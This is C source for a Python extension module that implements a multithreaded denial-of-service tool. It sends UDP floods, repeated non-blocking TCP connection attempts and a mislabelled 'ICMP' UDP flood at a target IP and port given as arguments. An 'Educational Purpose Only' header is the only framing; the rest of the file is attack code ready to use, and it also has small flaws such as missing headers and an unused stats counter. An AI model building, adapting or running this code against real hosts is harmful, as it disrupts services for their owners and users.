/*
 * Fast DDoS Attack C Extension - Windows Compatible
 * Educational Purpose Only - For Controlled Lab Environment
 */

#include <Python.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#define close closesocket
#define sleep(x) Sleep((x) * 1000)
typedef HANDLE pthread_t;
typedef HANDLE pthread_mutex_t;
#define pthread_mutex_init(m, a) (*(m) = CreateMutex(NULL, FALSE, NULL))
#define pthread_mutex_lock(m) WaitForSingleObject(*(m), INFINITE)
#define pthread_mutex_unlock(m) ReleaseMutex(*(m))
#define pthread_mutex_destroy(m) CloseHandle(*(m))
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#endif

#define MAX_THREADS 100
#define PACKET_SIZE 1024
#define DEFAULT_PACKETS_PER_THREAD 1000

typedef struct {
    char target_ip[16];
    int target_port;
    int attack_type; // 0=UDP, 1=TCP, 2=ICMP
    int packets_to_send;
    int thread_id;
    unsigned long* total_packets_sent;
    pthread_mutex_t* stats_mutex;
} ddos_thread_data;

static int winsock_initialized = 0;
static unsigned long global_packets_sent = 0;
static pthread_mutex_t global_stats_mutex;

// Initialize networking
static int init_networking() {
#ifdef _WIN32
    if (!winsock_initialized) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return -1;
        }
        winsock_initialized = 1;
    }
#endif
    return 0;
}

// Cleanup networking
static void cleanup_networking() {
#ifdef _WIN32
    if (winsock_initialized) {
        WSACleanup();
        winsock_initialized = 0;
    }
#endif
}

// Cross-platform thread creation
#ifdef _WIN32
typedef DWORD (WINAPI *thread_func_t)(LPVOID);
static int create_thread(pthread_t* thread, void* attr, void* (*start_routine)(void*), void* arg) {
    *thread = CreateThread(NULL, 0, (thread_func_t)start_routine, arg, 0, NULL);
    return (*thread == NULL) ? -1 : 0;
}

static int join_thread(pthread_t thread, void** retval) {
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    return 0;
}
#else
#define create_thread pthread_create
#define join_thread pthread_join
#endif

// Generate random data
static void generate_random_data(char* buffer, int size) {
    static int seed_initialized = 0;
    if (!seed_initialized) {
        srand((unsigned int)time(NULL));
        seed_initialized = 1;
    }
    
    for (int i = 0; i < size; i++) {
        buffer[i] = (char)(rand() % 256);
    }
}

// UDP flood attack
static int udp_flood_attack(const char* target_ip, int target_port, int packet_count) {
    int sockfd;
    struct sockaddr_in target_addr;
    char packet[PACKET_SIZE];
    int packets_sent = 0;
    
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return 0;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return 0;
    }
    
    for (int i = 0; i < packet_count; i++) {
        generate_random_data(packet, PACKET_SIZE);
        
        if (sendto(sockfd, packet, PACKET_SIZE, 0, 
                   (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            packets_sent++;
        }
        
        // Small delay to prevent overwhelming
        if (i % 100 == 0) {
#ifdef _WIN32
            Sleep(1);
#else
            usleep(1000);
#endif
        }
    }
    
    close(sockfd);
    return packets_sent;
}

// TCP SYN flood attack
static int tcp_syn_flood_attack(const char* target_ip, int target_port, int packet_count) {
    int sockfd;
    struct sockaddr_in target_addr;
    int packets_sent = 0;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return 0;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return 0;
    }
    
    // Set non-blocking mode for faster connections
#ifdef _WIN32
    u_long mode = 1;
    ioctlsocket(sockfd, FIONBIO, &mode);
#else
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
#endif
    
    for (int i = 0; i < packet_count; i++) {
        if (connect(sockfd, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0 || 
#ifdef _WIN32
            WSAGetLastError() == WSAEWOULDBLOCK || WSAGetLastError() == WSAEALREADY
#else
            errno == EINPROGRESS || errno == EALREADY
#endif
            ) {
            packets_sent++;
        }
        
        close(sockfd);
        
        // Create new socket for next attempt
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) break;
        
#ifdef _WIN32
        ioctlsocket(sockfd, FIONBIO, &mode);
#else
        flags = fcntl(sockfd, F_GETFL, 0);
        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
#endif
        
        if (i % 50 == 0) {
#ifdef _WIN32
            Sleep(1);
#else
            usleep(1000);
#endif
        }
    }
    
    close(sockfd);
    return packets_sent;
}

// Simple ICMP-like flood (UDP to port 0)
static int icmp_flood_attack(const char* target_ip, int packet_count) {
    int sockfd;
    struct sockaddr_in target_addr;
    char packet[64];
    int packets_sent = 0;
    
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return 0;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(0); // Port 0 for ICMP-like behavior
    if (inet_pton(AF_INET, target_ip, &target_addr.sin_addr) <= 0) {
        close(sockfd);
        return 0;
    }
    
    for (int i = 0; i < packet_count; i++) {
        generate_random_data(packet, 64);
        
        if (sendto(sockfd, packet, 64, 0, 
                   (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            packets_sent++;
        }
        
        if (i % 100 == 0) {
#ifdef _WIN32
            Sleep(1);
#else
            usleep(1000);
#endif
        }
    }
    
    close(sockfd);
    return packets_sent;
}

// DDoS thread worker
#ifdef _WIN32
static DWORD WINAPI ddos_thread_worker(LPVOID arg) {
#else
static void* ddos_thread_worker(void* arg) {
#endif
    ddos_thread_data* data = (ddos_thread_data*)arg;
    int packets_sent = 0;
    
    switch (data->attack_type) {
        case 0: // UDP flood
            packets_sent = udp_flood_attack(data->target_ip, data->target_port, data->packets_to_send);
            break;
        case 1: // TCP SYN flood
            packets_sent = tcp_syn_flood_attack(data->target_ip, data->target_port, data->packets_to_send);
            break;
        case 2: // ICMP flood
            packets_sent = icmp_flood_attack(data->target_ip, data->packets_to_send);
            break;
        default:
            packets_sent = 0;
    }
    
    // Update global statistics
    pthread_mutex_lock(data->stats_mutex);
    *(data->total_packets_sent) += packets_sent;
    pthread_mutex_unlock(data->stats_mutex);
    
    return 0;
}

// Main DDoS attack function
static PyObject* fast_ddos_attack(PyObject* self, PyObject* args) {
    const char* target_ip;
    int target_port = 80;
    const char* attack_type_str = "udp";
    int duration = 60;
    int threads = 10;
    
    if (!PyArg_ParseTuple(args, "s|isii", &target_ip, &target_port, &attack_type_str, &duration, &threads)) {
        return NULL;
    }
    
    if (init_networking() != 0) {
        PyErr_SetString(PyExc_RuntimeError, "Failed to initialize networking");
        return NULL;
    }
    
    // Determine attack type
    int attack_type = 0; // Default to UDP
    if (strcmp(attack_type_str, "tcp") == 0) {
        attack_type = 1;
    } else if (strcmp(attack_type_str, "icmp") == 0) {
        attack_type = 2;
    }
    
    // Limit threads
    if (threads > MAX_THREADS) {
        threads = MAX_THREADS;
    }
    
    unsigned long total_packets_sent = 0;
    pthread_mutex_t stats_mutex;
    pthread_mutex_init(&stats_mutex, NULL);
    
    pthread_t* thread_handles = malloc(threads * sizeof(pthread_t));
    ddos_thread_data* thread_data = malloc(threads * sizeof(ddos_thread_data));
    
    if (!thread_handles || !thread_data) {
        free(thread_handles);
        free(thread_data);
        pthread_mutex_destroy(&stats_mutex);
        cleanup_networking();
        PyErr_SetString(PyExc_MemoryError, "Failed to allocate memory for threads");
        return NULL;
    }
    
    int packets_per_thread = (duration * 100) / threads; // Roughly 100 packets per second per thread
    if (packets_per_thread < DEFAULT_PACKETS_PER_THREAD) {
        packets_per_thread = DEFAULT_PACKETS_PER_THREAD;
    }
    
    // Create and start threads
    for (int i = 0; i < threads; i++) {
        strncpy(thread_data[i].target_ip, target_ip, sizeof(thread_data[i].target_ip) - 1);
        thread_data[i].target_ip[sizeof(thread_data[i].target_ip) - 1] = '\0';
        thread_data[i].target_port = target_port;
        thread_data[i].attack_type = attack_type;
        thread_data[i].packets_to_send = packets_per_thread;
        thread_data[i].thread_id = i;
        thread_data[i].total_packets_sent = &total_packets_sent;
        thread_data[i].stats_mutex = &stats_mutex;
        
        if (create_thread(&thread_handles[i], NULL, ddos_thread_worker, &thread_data[i]) != 0) {
            // Failed to create thread, reduce thread count
            threads = i;
            break;
        }
    }
    
    // Wait for all threads to complete
    for (int i = 0; i < threads; i++) {
        join_thread(thread_handles[i], NULL);
    }
    
    // Cleanup
    free(thread_handles);
    free(thread_data);
    pthread_mutex_destroy(&stats_mutex);
    cleanup_networking();
    
    return Py_BuildValue("l", total_packets_sent);
}

// Get attack statistics
static PyObject* get_ddos_stats(PyObject* self, PyObject* args) {
    return Py_BuildValue("l", global_packets_sent);
}

// Method definitions
static PyMethodDef FastDDoSMethods[] = {
    {"attack", fast_ddos_attack, METH_VARARGS, "Fast DDoS attack"},
    {"get_stats", get_ddos_stats, METH_VARARGS, "Get DDoS attack statistics"},
    {NULL, NULL, 0, NULL}
};

// Module definition
static struct PyModuleDef fast_ddos_module = {
    PyModuleDef_HEAD_INIT,
    "fast_ddos_attack",
    "Fast DDoS attack C extension",
    -1,
    FastDDoSMethods
};

// Module initialization
PyMODINIT_FUNC PyInit_fast_ddos_attack(void) {
    pthread_mutex_init(&global_stats_mutex, NULL);
    return PyModule_Create(&fast_ddos_module);
}
